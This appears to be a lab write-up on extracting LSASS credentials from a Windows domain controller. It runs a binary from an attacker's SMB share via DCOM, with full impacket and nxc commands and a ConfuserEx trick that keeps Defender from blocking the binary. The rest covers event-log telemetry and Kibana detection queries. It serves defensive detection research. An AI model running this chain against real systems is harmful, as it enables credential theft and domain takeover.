# Remote LSASS Credential Access via UNC Execution and DCOM Lateral Movement

**Target:** Windows Server 2019 Standard Evaluation (Build 17763, KB5082123 — April 2026 CU) — Primary Domain Controller  
**Role:** lab2019.local DC — WIN-JOCP945SK51  
**UBR:** 17763.8644  
**Defender signatures:** AV 1.451.93.0 / Engine 1.1.26040.8 (current as of 25 May 2026)  
**Real-time protection:** Enabled — `AMRunningMode: Normal`  
**Context:** Assumed breach — valid Domain Administrator credentials in hand  
**Methodology:** Operational assumption analysis — documenting where defensive stack assumptions exceed their actual guarantees

---

## Research Question

Given assumed breach on a domain controller, can credential material be extracted from LSASS entirely remotely — without the attacking binary ever touching the target filesystem — and what does the defensive stack actually observe?

The resulting telemetry includes a distinctive EID 4663 process representation (`\Device\Mup\192.168.1.218\share\curnxc1.exe`) that directly fingerprints UNC-hosted execution against LSASS — surfaced here for the first time in this research context.

---

## Key Findings

- UNC-hosted execution removed the local on-write scan surface but shifted inspection to network-share retrieval
- EID 4663 captured LSASS access regardless of delivery path — local or UNC
- UNC execution surfaced as `\Device\Mup\...` in process telemetry — the kernel's representation of a UNC-hosted executable, and a directly huntable signal
- A custom Sysmon rule combining zeroed IMPHASH + UNC image path + absent PE metadata fired consistently
- Prevention and telemetry diverged under tested conditions: telemetry remained available while Defender prevention did not trigger on repeated execution of the fresh-obfuscated binary

---

## The Memory Walker

The credential extraction component is a custom .NET implementation that acquires LSASS process memory and produces a structurally valid minidump parseable by standard forensic tooling (pypykatz, KvcForensic). Internal implementation details are intentionally omitted — this document is focused on telemetry characterization, not capability transfer.

The binary is passed through ConfuserEx prior to deployment — a .NET obfuscator originally designed for IP protection, applied here with rename, control flow mangling, and constants encoding. It produces non-deterministic output: each compile yields a different binary with a different hash, observed to shift the cloud ML verdict below Defender's block threshold under these lab conditions. In the tested configuration, the obfuscation pipeline produced binaries with a zeroed IMPHASH and absent PE publisher metadata, introducing a separate Sysmon-visible anomaly documented in the telemetry section below.

---

## The Ingress Problem

Copying the binary to the target disk via SMB triggers Defender's on-write scan. Under this lab configuration, `DetectionType: FastPath` — a cloud-assisted ML verdict — fires on the binary bytes as they land, regardless of the destination path. The detection surface is the write event itself.

The question: can execution be achieved without a local write, eliminating the on-write scan surface entirely?

Answer: yes — via UNC-hosted execution. The binary is served from Kali over SMB and executed directly from the network path. The target fetches and runs it without persisting it to local disk. Remove the local disk ingress point, shift the scan surface to network retrieval.

---

## The Chain

### Prerequisites on Kali

**Terminal 1 — SMB server (keep running throughout):**
```bash
impacket-smbserver share /home/kali/ -smb2support
```

Anonymous access — no credentials required. The binary (`curnxc1.exe`) must be in `/home/kali/`.

### Execution

**Terminal 2 — dcomexec:**
```bash
impacket-dcomexec -object MMC20 lab2019.local/administrator:'<password>'@192.168.1.251 \
  "\\\\192.168.1.218\\share\\curnxc1.exe C:\\ProgramData\\lsass.dmp" -nooutput
```

Returns immediately. The binary executes on the target from the UNC path — never written to local disk.

### Retrieve the dump

Wait ~30 seconds for the binary to complete, then:

```bash
nxc smb 192.168.1.251 -u administrator -p '<password>' \
  --get-file '\ProgramData\lsass.dmp' /tmp/dumps/unc_test.dmp
```

### Parse

```bash
pypykatz lsa minidump /tmp/dumps/unc_test.dmp
```

---

## Results

Two successive runs with the same binary, same hash, Defender active:

**Run 1:**
```
SMB  192.168.1.251  445  WIN-JOCP945SK51  [+] File "\ProgramData\lsass.dmp" was downloaded to "/tmp/dumps/unc_test.dmp"
```

**Run 2 (same binary, no recompile):**
```
SMB  192.168.1.251  445  WIN-JOCP945SK51  [+] File "\ProgramData\lsass.dmp" was downloaded to "/tmp/dumps/unc_test.dmp"
```

Both runs produced full dumps. No Defender alert on either run. pypykatz parsed clean on both.

```
FILE: ======== /tmp/dumps/unc_test.dmp =======
== LogonSession ==
authentication_id 553694 (872de)
session_id 1
username Administrator
domainname LAB2019
logon_server WIN-JOCP945SK51
        == MSV ==
                Username: Administrator
                Domain: LAB2019
                LM: NA
                NT: 3c02b6b6fb6b3b17<redacted>
                SHA1: af61169243da7612a6<redacted>
        == Kerberos ==
                Username: Administrator
                Domain: LAB2019.LOCAL
                AES256 Key: e481d8013b3cde25<redacted>
```

---

## ELK Telemetry — EID 4663 via Kibana

With winlogbeat shipping to ELK, the following event was captured during the run:

```
@timestamp:          May 26, 2026 @ 00:23:14.434
event.code:          4663
event.action:        Kernel Object

Subject:
  Account Name:      Administrator
  Account Domain:    LAB2019
  Logon ID:          0x6199E6

Object:
  Object Type:       Process
  Object Name:       \Device\HarddiskVolume4\Windows\System32\lsass.exe
  Handle ID:         0x308

Process Information:
  Process ID:        0x18cc
  Process Name:      \Device\Mup\192.168.1.218\share\curnxc1.exe

Access Request Information:
  Accesses:          Read from process memory
  Access Mask:       0x10
```

The critical field is `Process Name: \Device\Mup\192.168.1.218\share\curnxc1.exe`.

`\Device\Mup\` is the Windows Multiple UNC Provider — the kernel-level UNC path resolver. The process name in EID 4663 reflects the full UNC path rather than a local filesystem path. This is the forensic signature of UNC execution in the audit log.

**Comparison:**

| Delivery method | EID 4663 Process Name |
|---|---|
| SMB upload chain | `C:\ProgramData\curnxc.exe` |
| UNC dcomexec chain | `\Device\Mup\192.168.1.218\share\curnxc1.exe` |

The event fires in both cases — EID 4663 catches UNC execution just as it catches local execution. The attacker's Kali IP (192.168.1.218) is visible in the process name field, and `Access Mask: 0x10` (PROCESS_VM_READ) against lsass.exe is unambiguous in both.

UNC execution does not evade EID 4663. It changes the process name field from a local path to a UNC path — which is itself a detection signal. A rule matching `ObjectName: *lsass*` AND `ProcessName: *\Device\Mup\*` AND `AccessMask: 0x10` provides a high-confidence signal for this delivery pattern — though legitimate UNC-hosted administrative tooling could produce similar events and would need to be baselined.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | 
  Where-Object {$_.Id -in @(1116,1117) -and $_.TimeCreated -gt (Get-Date "2026-05-25 17:00:00")} | 
  Select-Object TimeCreated, Message | Format-List
```

Output: empty. No Defender alerts fired during or after the successful run.

An earlier run using the previous (classified) binary hash produced:

```
Name: Trojan:Win32/Bearfoos.B!ml
Path: file:_\\192.168.1.218\share\curnxc1.exe
Detection Origin: Network share
Detection Type: FastPath
Detection Source: Real-Time Protection
Action: Quarantine
```

`Detection Origin: Network share` — Defender scans binaries fetched from UNC paths, not just local writes. With a known hash it fires. With a fresh ConfuserEx hash it does not.

---

## Why No SMB Server Readout

The Impacket smbserver produces no explicit "connected from X.X.X.X" output. The `0xf` query path info messages seen during testing are Impacket receiving an SMB info level query it doesn't implement — those are the connection callbacks. The absence of verbose logging is an Impacket limitation, not an absence of activity.

To confirm the connection independently:

```bash
tcpdump -i any -nn 'host 192.168.1.251 and port 445'
```

---

## Sysmon EID 1 — Zeroed IMPHASH Alert

A second alert fired from a custom Kibana detection rule:

**Rule:** `Sysmon - Unsigned Binary with Zeroed IMPHASH`  
**Severity:** Medium  
**Query:** `IMPHASH=00000000000000000000000000000000` AND `Company: "-"`

```
Image:             \\192.168.1.218\share\curnxc1.exe
CommandLine:       \\192.168.1.218\share\curnxc1.exe C:\ProgramData\lsass.dmp
ParentImage:       C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe" /Q /c \\192.168.1.218\share\curnxc1.exe C:\ProgramData\lsass.dmp
IntegrityLevel:    High
User:              LAB2019\Administrator
Hashes:            MD5=A84112EC246DB8E541B8C5B06A083894
                   SHA256=6532A7AA099396388E5972B7D273D8B75411A72170E945A1E9DFED9069285E84
                   IMPHASH=00000000000000000000000000000000
```

**Why the IMPHASH is zeroed:** ConfuserEx scrambles the binary's import table as part of its obfuscation pipeline. The Import Hash is calculated from that table — when the imports are sufficiently mangled, the result is an all-zero IMPHASH. This is a known PE manipulation indicator.

**The tradeoff:** ConfuserEx defeats Defender's static ML signature (`Bearfoos`) but introduces a Sysmon-detectable PE anomaly. The same obfuscation that shifts the cloud verdict also zeroes the IMPHASH and strips publisher metadata — three correlated signals in a single Sysmon EID 1 event:

1. `IMPHASH=00000000000000000000000000000000` — zeroed import hash
2. `Image: \\192.168.1.218\share\curnxc1.exe` — UNC-hosted binary
3. `Company: -` / `Description: -` / `OriginalFileName: -` — no PE metadata

Any one of these is weak individually. All three together on a process that subsequently reads lsass memory is a high-confidence detection cluster.

**Detection logic combining both surfaces:**

```
event.code: "1" AND
winlog.event_data.Hashes: *IMPHASH=00000000000000000000000000000000* AND
winlog.event_data.Image: *\\\\* AND
winlog.event_data.CommandLine: *lsass*
```

Or more generically for UNC-hosted unsigned binaries:

```
event.code: "1" AND
winlog.event_data.Hashes: *IMPHASH=00000000000000000000000000000000* AND
(winlog.event_data.Image: *\\\\* OR winlog.event_data.Image: *Device\\Mup*)
```

---

## Detection Surface Summary

| Detection | Fired | Source |
|---|---|---|
| Defender `Bearfoos` ML (fresh hash) | No | Defender AV |
| EID 4663 PROCESS_VM_READ on lsass | Yes | Windows Security audit |
| Sysmon EID 1 zeroed IMPHASH | Yes | Sysmon + Kibana rule |
| Defender `SuspRemoteCmdCommand` | No — `-nooutput` suppresses redirect | Defender AV |

---

## Observed Enforcement and Telemetry Surfaces

| Surface | SMB upload chain | UNC dcomexec chain |
|---|---|---|
| Binary written to target disk | Yes | No |
| On-write scan triggered | Yes | No |
| Network share scan triggered | No | Yes |
| cmd.exe output redirect (`1> \Temp\random`) | Yes (suppressed via `get_output=False`) | No — `-nooutput` flag |
| Defender alerts (fresh ConfuserEx hash) | None post-verdict | None |
| EID 4663 Process Name | `C:\ProgramData\curnxc.exe` | `\Device\Mup\192.168.1.218\share\curnxc1.exe` |

---

## How the Chain Works

`impacket-dcomexec` connects to the target via DCOM using the MMC20 Application object. The command is executed by a child process of the MMC20 COM server running as SYSTEM. That process resolves the UNC path `\\192.168.1.218\share\curnxc1.exe` over SMB, fetches and executes the binary directly from the UNC path without persisting it to local disk. The binary:

1. Runs from the network path — never touches the target filesystem
2. Opens an LSASS handle via `NtOpenProcess`
3. Walks memory regions and constructs the minidump
4. Writes the dump to `C:\ProgramData\lsass.dmp` — the only local file write
5. Exits

The dump file is the only artifact on the target disk. The executable is not persisted to the local filesystem, though execution and audit telemetry remain.

`-nooutput` suppresses the cmd.exe output redirect file (`1> \Windows\Temp\<random> 2>&1`) that triggered `VirTool:Win32/SuspRemoteCmdCommand.H` in earlier testing.

---

## The Hash Dependency

Observed behavior is consistent with a hash/reputation-driven evaluation path similar to the on-write scan. A binary with a known-malicious hash gets caught at the network fetch stage (`Detection Origin: Network share`). A binary with an unknown hash passes through.

Observed behavior suggests a cached reputation/verdict state during repeated execution — the same binary hash ran twice without triggering blocking or reclassification after the initial successful run. Both runs in this session used the same binary with no recompile, and neither triggered Defender. This is a more stable execution path than the SMB upload chain, where the on-write scan re-evaluates on every upload.

Fresh ConfuserEx compile resets the hash when needed. The cost of resetting the execution window is one recompile — but with UNC execution the need to recompile is less frequent since the same hash remains usable across repeated runs.

---

## Scope and Validity Constraints

- Same lab conditions as previous Vector — single DC, Defender AV only, no MDE, no WDAC
- `SubmitSamplesConsent: 0` on this host — non-default, extends verdict cache window
- Anonymous SMB share on Kali — production environments may restrict outbound SMB (445) from DCs to unknown hosts; not tested here
- dcomexec MMC20 requires DCOM ports (135 + dynamic RPC range) to be reachable — standard in domain environments

---

*Target: Windows Server 2019 Build 17763 — lab2019.local PDC*  
*Defender AV: 1.451.93.0 / Engine: 1.1.26040.8*  
*Test date: 25 May 2026*  
*Methodology: Operational assumption analysis — trust assumptions as attack surfaces*

SELECTED SCREENSHOTS:

<img width="1912" height="1062" alt="attack" src="https://github.com/user-attachments/assets/53fa32ad-af80-44a3-b386-8511009aed9a" />

<img width="1803" height="1039" alt="filedumpandrtp" src="https://github.com/user-attachments/assets/425bf42d-0caa-4b25-8f12-e189758ef8a4" />

<img width="1324" height="480" alt="ubr+rtp" src="https://github.com/user-attachments/assets/ab3014a4-d234-4e39-bb38-399f5e248edb" />

<img width="1776" height="889" alt="confuser" src="https://github.com/user-attachments/assets/5eaf624a-8df0-4966-811c-67d5063fd606" />

<img width="1900" height="1044" alt="4663" src="https://github.com/user-attachments/assets/ac06933f-8cd9-4d29-8169-1e2ac4f860ea" />

<img width="1914" height="1080" alt="zeroedimphash1" src="https://github.com/user-attachments/assets/a0670df8-375e-4182-a73a-884cb620d4e7" />






